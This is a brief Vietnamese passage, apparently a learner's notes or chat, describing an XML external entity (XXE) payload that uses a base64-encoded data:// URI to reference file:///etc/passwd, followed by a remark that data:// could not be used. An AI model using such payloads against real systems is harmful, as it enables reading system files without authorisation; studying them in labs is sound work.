- Trong trường hợp này em sẽ sử dụng data:// thực hiện base 64 decode với đoạn  ZmlsZTovLy9ldGMvcGFzc3dk là file:///etc/passwd được encode-base64 thì khi đó em sẽ có payload là :

```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```


- cái này em khum dùng được data:// anh ơi:(((